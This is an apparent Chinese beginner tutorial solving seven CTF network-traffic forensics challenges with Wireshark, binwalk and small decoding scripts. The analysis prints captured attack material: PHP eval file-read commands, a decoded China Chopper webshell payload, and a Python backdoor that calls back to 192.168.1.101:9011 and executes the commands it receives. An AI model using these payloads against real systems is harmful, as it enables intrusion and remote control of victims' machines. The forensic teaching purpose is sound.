本文原创作者： 一叶飘零

原创投稿详情：[重金悬赏 |
合天原创投稿等你来！](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652846451&idx=2&sn=2456db03a3a77d5ff8064449c34ffceb&chksm=bd5945be8a2ecca808f62ee5726223c16cab235d216c891df2dd114b8539001390dbad37bccd&scene=21#wechat_redirect)

* * *

#  **前记**

最近准备了一个流量分析的课题，于是搜集了一些题目

本篇文章为第一篇：流量分析-CTF题目实战

后续会继续撰写：流量分析-企业渗透案例

#  **题目1**

打开流量包即可看到

![流量分析-CTF题目实战-终板741.png](https://image.3001.net/images/20180425/15246242708225.png!small)

解码得到  

user:test@51elab.com

passwd:FLAG:ISCCTESTpas

即可完成第一题

#  **题目2**

随便跟踪一个tcp流

流0:

![流量分析-CTF题目实战-终板822.png](https://image.3001.net/images/20180425/15246242947447.png!small)  

流1:

![流量分析-CTF题目实战-终板828.png](https://image.3001.net/images/20180425/15246243085444.png!small)

即可发现flag  
moctf{c@N_y0U_4lnd_m8}

 **  
**

#  **题目3**

我们切换至http进行查看

![流量分析-CTF题目实战-终板882.png](https://image.3001.net/images/20180425/152462439746.png!small)发现大量数据爆破，猜想是黑客进行扫描  

浏览之后，发现最后存在可疑操作

![流量分析-CTF题目实战-终板918.png](https://image.3001.net/images/20180425/15246244371825.png!small)

黑客执行phpinfo成功  

然后分别执行命令

> php
>
> print_r(gzcompress(file_get_contents(base64_decode(%22aW5kZXgucGhw%22))))
>
> print_r(gzcompress(file_get_contents(base64_decode(%22ZmxhZy50eHQ%22))))

我们解码查看操作文件名

index.php

flag.txt

发现黑客最后将flag.txt的内容读取，并进行gz压缩

我们切换至原始数据，提取flag.txt的gz压缩二进制内容

>
> 789ccbc82c492e49abb6304d32484c354eb4483437b048b234324f4a334c343648494b334e36333531a8e5020018cb0c6c

保存成文件

然后写脚本进行解压缩

> php
>
> <?php
>
> $a = gzuncompress(file_get_contents('./1'));
>
> echo $a;
>
> ?>

即可获得flag

hitctf{85b0ae3a8a708b927bf1a30dff3c6540}

# **题目4**

同样，我们先查看http流量

![流量分析-CTF题目实战-终板1447.png](https://image.3001.net/images/20180425/15246247595566.png!small)

可以发现有人不断像  

/uploads/dvwa.php

提交POST数据

根据目录，猜想可能存在一句话木马，进入tcp流跟踪

果然发现可疑操作

>
> cmd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D

解码

>
> cmd=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==

解base64

> php
>
> @ini_set("display_errors","0");
>
> @set_time_limit(0);
>
> @set_magic_quotes_runtime(0);
>
> echo("->|");;
>
> $D=dirname($_SERVER["SCRIPT_FILENAME"]);
>
> if($D=="")
>
> $D=dirname($_SERVER["PATH_TRANSLATED"]);
>
> $R="{$D}\t";
>
> if(substr($D,0,1)!="/")
>
> {
>
> foreach(range("A","Z") as $L)
>
> if(is_dir("{$L}:"))
>
> $R.="{$L}:";
>
> }
>
> $R.="\t";
>
> $u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';
>
> $usr=($u)?$u['name']:@get_current_user();
>
> $R.=php_uname();
>
> $R.="({$usr})";
>
> print $R;;
>
> echo("|<-");
>
> die();

发现为中国菜刀的流量

遍历查看黑客操作

在tcp stream 5和6

分别发现猫腻

tcp stream 5

![流量分析-CTF题目实战-终板3462.png](https://image.3001.net/images/20180425/15246248592795.png!small)发现存在rar压缩包  

利用wireshark的导出对象功能，我们导出该文件，并进行binwalk

![流量分析-CTF题目实战-终板3513.png](https://image.3001.net/images/20180425/15246248891794.png!small)果然发现rar文件  

利用命令

binwalk q5 -e

提取压缩包，

解压后发现前半部分的key

![流量分析-CTF题目实战-终板3566.png](https://image.3001.net/images/20180425/15246253822795.png!small)

然后追踪tcp stream 6  
![流量分析-CTF题目实战-终板3584.png](https://image.3001.net/images/20180425/15246254022866.png!small)

发现8950开头格式

根据经验，我知道这是png文件

于是我将其复制出来，利用php语言写入至文件

> <?php
>
> function str2bin($hexdata)
>
> {
>
> $bindata="";
>
> for ($i=0;$i < strlen($hexdata);$i+=2) {
>
> $bindata.=chr(hexdec(substr($hexdata,$i,2)));
>
> }
>
> return $bindata;
>
> }
>
> $a = file_get_contents("./123.txt");
>
> $a = $a;
>
> $b = str2bin($a);
>
> file_put_contents("./1.png",$b);

随机得到图片

  
![流量分析-CTF题目实战-终板3950.png](https://image.3001.net/images/20180425/15246254812019.png!small)

故此得到完整的key

c7265f898a52fcc4

#  **题目5**

我们打开tcp跟踪流

看到这样的文件

![流量分析-CTF题目实战-终板4005.png](https://image.3001.net/images/20180425/15246255246877.png!small)猜测可能存在pyc文件流内容  

我们尝试http导出对象

![流量分析-CTF题目实战-终板4034.png](https://image.3001.net/images/20180425/15246255561280.png!small)果不其然发现pyc文件  

我们提取后经过在线pyc反编译

<https://tool.lu/pyc/>

成功得到client.py文件

打开后发现大量base64拆分数组的混淆

如下图

![image.png](https://image.3001.net/images/20180425/15246256048007.png!small)

我们尝试解码最后的Base64代码  

得到内容

> python
>
> strr=""
>
> for i in range(0,1158):
>
> strr=strr+arg[i][::-1]
>
> exec(base64.b64decode(strr))

  

我们尝试结合上面1158个混淆数组，进行运行，查看内容

![image.png](https://image.3001.net/images/20180425/15246256484927.png!small)

我们得到如下内容

> import base64
>
> import socket
>
> import sys
>
> import os
>
> import time
>
>
> decs='A/MNCs/sv1ljAAAAAAAAAAAGAAAAQAAAAHObAQAAZAAAZAEAbAAAWgEAZAAAZAEAbAIAWgMAZAAAZAEAbAQAWgUAZAAAZAEAbAYAWgcAZAIAWggAaSAAZAMAZAQANmQFAGQGADZkBwBkCAA2ZAkAZAoANmQLAGQMA……………..'(注，过长，就省略了)
>
>
> f2=open('d'+'e'+'c'+'.'+'p'+'y'+'c','w');f2.write(base64.b64decode(decs));f2.close();import
> dec;os.system('rm -rf dec.pyc')
>
> remote_ip='192.168.1.101'
>
> port=9011
>
> def send_m(remote_ip , port,msg,get=False):
>
> all_data=[]
>
> try:
>
> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>
> s.connect((remote_ip , port))
>
> if get:
>
> message=msg
>
> else:
>
> message=enc.fun(msg)
>
> s.sendall(message)
>
> while True:
>
> data = s.recv(20480)
>
> if data:
>
> string = bytes.decode(data, 'utf-8')
>
> break
>
> return dec.fun(string)
>
> except socket.error, msg:
>
> print 'emmmmmmm_boom'
>
> sys.exit();
>
> encs=send_m(remote_ip,port,'just_a_test',True)
>
>
> f1=open('e'+'n'+'c'+'.'+'p'+'y'+'c','w');f1.write(base64.b64decode(encs));f1.close();import
> enc;os.system('rm -rf enc.pyc')
>
> while True:
>
> exec(send_m(remote_ip,port,'I lose my way'))
>
> print('new loop after 5s')
>
> time.sleep(5)

可以看到代码首先写入了dec.pyc

然后看到

> while True:
>
> data = s.recv(20480)
>
> if data:
>
> string = bytes.decode(data, 'utf-8')
>
> break
>
> return dec.fun(string)

代码会调用dec的fun函数进行密文解密

并且发现这是一个socket链接

我们在流量包中寻找密文

![image.png](https://image.3001.net/images/20180425/15246257559889.png!small)

容易发现如上密文

我们调用dec.py解密

![流量分析-CTF题目实战-终板5618.png](https://image.3001.net/images/20180425/15246257957302.png!small)![流量分析-CTF题目实战-终板6864.png](https://image.3001.net/images/20180425/15246257954850.png!small)

即可看到flag

#  **题目6**

解压后得到题目

++__++

由于不知道后缀，我们file一下查看

file ++__++

得到结果

++__++: pcap-ng capture file - version 1.0

我们更改文件为

++__++.pcapng

分析流量，在追踪tcp流的时候发现文件内容

> # coding:utf-8
>
> from Crypto import Random
>
> from Crypto.Cipher import AES
>
> import sys
>
> import base64
>
> IV = 'QWERTYUIOPASDFGH'
>
> def decrypt(encrypted):
>
> aes = AES.new(IV, AES.MODE_CBC, IV)
>
> return aes.decrypt(encrypted)
>
> def encrypt(message):
>
> length = 16
>
> count = len(message)
>
> padding = length - (count % length)
>
> message = message + '\0' * padding
>
> aes = AES.new(IV, AES.MODE_CBC, IV)
>
> return aes.encrypt(message)
>
> str = 'this is a test'
>
> example = encrypt(str)
>
> print(decrypt(example))

发现函数调用了AES加密

aes = AES.new(IV, AES.MODE_CBC, IV)

其中密钥为偏移量，即IV

QWERTYUIOPASDFGH

我们寻找密文

发现如下操作

[root@localhost wireshark]# cat 22

19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=

找到密文

我们进行在线解密

![image.png](https://image.3001.net/images/20180425/15246258843310.png!small)

此时可以得到password  

但是发现不是flag，于是我们继续分析流量

发现操作

> [root@localhost wireshark]# cat 11
>
> Rar!....3...
>
> .............TU..<.....
> .+......flag.txt0.....n.Kr..z....uEo.Bn&=i.S..>....4.B..~...xj.".
>
>
> ...u......3.....jWj..%m..!.+h...+s..q#.]...3Ks.y.....r.2...wVQ....[root@localhost
> wireshark]#

发现压缩包文件，我们提取后，利用之前的密码进行解密，得到flag

![image.png](https://image.3001.net/images/20180425/15246259364330.png!small)  

#  **题目7**

题目描述为有黑客入侵了我们的网站，只有流量，让我们发现黑客窃取的数据，打开数据包，大致浏览发现为http攻击，仔细看下，发现是黑客盲注了数据库，偷走了数据。

![image.png](https://image.3001.net/images/20180425/15246259602414.png!small)

这是典型的盲注的特征，但是盲注想要恢复数据，并不简单，  

所以这里需要用到较多的技巧和脚本。  

首先用wireshark打开流量包，过滤http协议：

![流量分析-CTF题目实战-终板6938.png](https://image.3001.net/images/20180425/15246260175990.png!small)  

然后发现并不好分析，只能将文件导出

然后因为盲注和返回的数据长度有关，用linux命令将url和数据长度提取出来，保存成data.txt

![image.png](https://image.3001.net/images/20180425/15246260591325.png!small)![image.png](https://image.3001.net/images/20180425/15246260673914.png!small)

这是保存成的结果，然后写脚本，恢复一下黑客得到的数据：  

脚本如下：

首先恢复user()数据：

![image.png](https://image.3001.net/images/20180425/15246261054784.png!small)![image.png](https://image.3001.net/images/20180425/15246261143133.png!small)  

然后恢复database()：

![image.png](https://image.3001.net/images/20180425/15246261347348.png!small)![image.png](https://image.3001.net/images/20180425/15246261437964.png!small)  

同理一步一步恢复数据，直至恢复出flag即可：

![image.png](https://image.3001.net/images/20180425/15246263962999.png!small)![image.png](https://image.3001.net/images/20180425/15246264082201.png!small)

即可获取flag

#  **后记**

本篇文章适合新手入门流量分析，题目难度由易到难。

本文题目链接：[
_https://pan.baidu.com/s/1jbWzpALbG93op5zWx257pQ_](https://pan.baidu.com/s/1jbWzpALbG93op5zWx257pQ)
密码： kdpv

（注：本文属合天智汇原创奖励文章，未经允许，禁止转载！）

